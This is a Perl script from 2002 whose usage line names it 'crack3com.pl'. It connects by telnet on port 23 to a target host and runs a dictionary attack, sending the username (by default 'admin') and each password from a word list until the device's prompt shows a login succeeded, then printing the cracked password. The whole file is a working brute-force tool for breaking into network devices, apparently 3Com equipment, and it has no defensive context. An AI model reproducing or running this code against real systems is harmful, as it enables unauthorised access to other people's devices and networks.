# FILE: "U:\My Documents\scripts\perl\sockets\test1.pl"
# LAST MODIFICATION: "Tue, 22 Oct 2002 15:55:05 Eastern Daylight Time"
# (C) 2002 by Jim Kipp, <james.kipp@mbna.com

use Socket;

sub guesspass {

$i=1;
$userh = $userf;
# append line feed and carriage return to username
$userf = join '', $userf, chr(13), chr(10);

recv(SOCK,$ol,1,0);
while(($ol ne "L") && ($ol ne "P") && ($ol ne "M")){
    recv(SOCK,$ol,1,0);
}

while(defined($passwd = <FILE1>)) {
   chop($passwd);
   print ".";
while($i != 3) {
   if($ol eq "L"){ 
    send(SOCK,$userf,0); 
   }
   if($ol eq "P") { 
    $passwd = join '', $passwd, chr(13), chr(10);
    send(SOCK,$passwd,0); 
   }
   recv(SOCK,$ol,1,0);
   while(($ol ne "L") && ($ol ne "P") && ($ol ne "M")){
    recv(SOCK,$ol,1,0);
   }
   if($ol eq "M") {
     print "\n\nPassword for $userh is $passwd\n";
     exit 0;
   }
$i++
}
$i=1;
}
print "\n\nIt's sad but true, you failed.\n";
}

#MAIN .....
# get host, dic file, and username args from cmd line
$remote = shift || die "usage: ./crack3com.pl [target host] [dictionary] (username)";
$passf = shift || die "usage: ./crack3com.pl [target host] [dictionary] (username)";
$userf = shift || ($userf = "admin");

# convert the ip addr arg string to the 4 byte network byte order
$iaddr = inet_aton($remote) or die "No target host computer found!";
# pack the adr and socket into a sockaddr_in structure
$paddr = sockaddr_in(23, $iaddr);
# translate the protocol name to it's number.
$prot = getprotobyname('tcp');
# open a tcp socket and attach to fh SOCK
socket(SOCK, AF_INET, SOCK_STREAM, $prot) or die "socket: $!";
# connect the socket to the target 
connect(SOCK, $paddr) || die "Can't connect to target host!"; 

open(FILE1, "$passf") || die "Can't open Password list!";
# recieve any messages on the socket and put into $ol. SOCK will block
# in this call waiting for a mesg. the 1 is length, and 0 is flags
recv(SOCK,$ol,1,0);
# line feed, carriage return, line feed 
$bs = join '', chr(10),chr(13),chr(10);
send(SOCK, $bs, 0); 
guesspass();

close(FILE1);
close(SOCK);
exit 0;

